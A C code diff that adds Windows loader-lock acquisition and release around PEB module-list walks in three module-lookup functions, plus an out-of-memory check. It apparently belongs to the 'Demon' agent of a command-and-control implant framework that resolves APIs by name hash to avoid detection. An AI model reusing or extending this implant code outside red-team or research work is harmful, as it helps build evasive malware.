@@ -65,6 +65,10 @@ ULONG HashEx(
 PVOID LdrModulePeb(
     IN DWORD Hash
 ) {
+    /* typedefs for inline-resolved loader lock functions */
+    typedef NTSTATUS ( NTAPI *fnLdrLockLoaderLock   )( ULONG Flags, PULONG Disposition, PULONG_PTR Cookie );
+    typedef NTSTATUS ( NTAPI *fnLdrUnlockLoaderLock )( ULONG Flags, ULONG_PTR Cookie );
+
     PLDR_DATA_TABLE_ENTRY Ldr = NULL;
     PLIST_ENTRY		      Hdr = NULL;
     PLIST_ENTRY		      Ent = NULL;
@@ -76,6 +80,17 @@ PVOID LdrModulePeb(
     }
 
     Peb = Instance->Teb->ProcessEnvironmentBlock;
+
+    /* resolve loader lock functions inline - guards concurrent PEB LDR list modification;
+     * if Modules.Ntdll is NULL (early DemonInit call, single-threaded), pLdrLock will be
+     * NULL and the if-guard below safely skips locking */
+    fnLdrLockLoaderLock   pLdrLock   = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_LDRLOCKLOADERLOCK );
+    fnLdrUnlockLoaderLock pLdrUnlock = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_LDRUNLOCKLOADERLOCK );
+
+    ULONG_PTR Cookie = 0;
+    /* acquire LoaderLock - serialises against any concurrent PEB LDR list walker or loader */
+    if ( pLdrLock ) pLdrLock( 0, NULL, &Cookie );
+
     Hdr = & Peb->Ldr->InLoadOrderModuleList;
     Ent = Hdr->Flink;
 
@@ -84,10 +99,12 @@ PVOID LdrModulePeb(
 
         /* Compare the DLL Name! */
         if ( ( HashEx( Ldr->BaseDllName.Buffer, Ldr->BaseDllName.Length, TRUE ) == Hash ) || Hash == 0 ) {
+            if ( pLdrUnlock ) pLdrUnlock( 0, Cookie );
             return Ldr->DllBase;
         }
     }
 
+    if ( pLdrUnlock ) pLdrUnlock( 0, Cookie );
     return NULL;
 }
 
@@ -99,6 +116,10 @@ PVOID LdrModulePeb(
 PVOID LdrModulePebByString(
     IN LPWSTR Module
 ) {
+    /* typedefs for inline-resolved loader lock functions */
+    typedef NTSTATUS ( NTAPI *fnLdrLockLoaderLock   )( ULONG Flags, PULONG Disposition, PULONG_PTR Cookie );
+    typedef NTSTATUS ( NTAPI *fnLdrUnlockLoaderLock )( ULONG Flags, ULONG_PTR Cookie );
+
     PLDR_DATA_TABLE_ENTRY Ldr  = NULL;
     PLIST_ENTRY		      Hdr  = NULL;
     PLIST_ENTRY		      Ent  = NULL;
@@ -113,7 +134,20 @@ PVOID LdrModulePebByString(
 
     Name = MmHeapAlloc( MAX_PATH );
 
+    /* guard OOM - MemCopy(NULL,...) would crash and leave LoaderLock permanently held */
+    if ( !Name )
+        return NULL;
+
     Peb = Instance->Teb->ProcessEnvironmentBlock;
+
+    /* resolve loader lock functions inline - guards concurrent PEB LDR list modification */
+    fnLdrLockLoaderLock   pLdrLock   = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_LDRLOCKLOADERLOCK );
+    fnLdrUnlockLoaderLock pLdrUnlock = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_LDRUNLOCKLOADERLOCK );
+
+    ULONG_PTR Cookie = 0;
+    /* acquire LoaderLock - serialises against any concurrent PEB LDR list walker or loader */
+    if ( pLdrLock ) pLdrLock( 0, NULL, &Cookie );
+
     Hdr = & Peb->Ldr->InLoadOrderModuleList;
     Ent = Hdr->Flink;
 
@@ -140,12 +174,20 @@ PVOID LdrModulePebByString(
 
             /* Compare the DLL Name! */
             if ( ( StringCompareW( Name, Module ) == 0 ) || Module == NULL ) {
-                return Ldr->DllBase;
+                PVOID DllBase = Ldr->DllBase;
+                if ( pLdrUnlock ) pLdrUnlock( 0, Cookie );
+                if ( Name ) {
+                    MemZero( Name, MAX_PATH );
+                    MmHeapFree( Name );
+                }
+                return DllBase;
             }
 
             MemZero( Name, MAX_PATH );
         }
     }
+
+    if ( pLdrUnlock ) pLdrUnlock( 0, Cookie );
 
     if ( Name ) {
         MemZero( Name, MAX_PATH );
@@ -165,6 +207,10 @@ PVOID LdrModulePebByString(
 PVOID LdrModuleSearch(
     IN LPWSTR ModuleName)
 {
+    /* typedefs for inline-resolved loader lock functions */
+    typedef NTSTATUS ( NTAPI *fnLdrLockLoaderLock   )( ULONG Flags, PULONG Disposition, PULONG_PTR Cookie );
+    typedef NTSTATUS ( NTAPI *fnLdrUnlockLoaderLock )( ULONG Flags, ULONG_PTR Cookie );
+
     PVOID                 FirstEntry  = NULL;
     PLDR_DATA_TABLE_ENTRY Entry       = NULL;
     WCHAR                 Name[ 260 ] = { 0 };
@@ -188,16 +234,28 @@ PVOID LdrModuleSearch(
 
     MemZero( Dll, sizeof( Dll ) );
 
+    /* resolve loader lock functions inline - guards concurrent PEB LDR list modification;
+     * also fixes ISS-011 (infinite loop when a concurrent unlink corrupts the Flink chain) */
+    fnLdrLockLoaderLock   pLdrLock   = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_LDRLOCKLOADERLOCK );
+    fnLdrUnlockLoaderLock pLdrUnlock = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_LDRUNLOCKLOADERLOCK );
+
+    ULONG_PTR Cookie = 0;
+    /* acquire LoaderLock - serialises against any concurrent PEB LDR list walker or loader */
+    if ( pLdrLock ) pLdrLock( 0, NULL, &Cookie );
+
     do
     {
         if ( ! StringCompareIW( Name, Entry->BaseDllName.Buffer ) ) {
+            PVOID DllBase = Entry->DllBase;
             MemZero( Name, sizeof( Name ) );
-            return Entry->DllBase;
+            if ( pLdrUnlock ) pLdrUnlock( 0, Cookie );
+            return DllBase;
         }
         Entry = (PLDR_DATA_TABLE_ENTRY) Entry->InLoadOrderLinks.Flink;
     } while ( Entry != FirstEntry );
 
     MemZero( Name, sizeof( Name ) );
+    if ( pLdrUnlock ) pLdrUnlock( 0, Cookie );
     return NULL;
 }
 
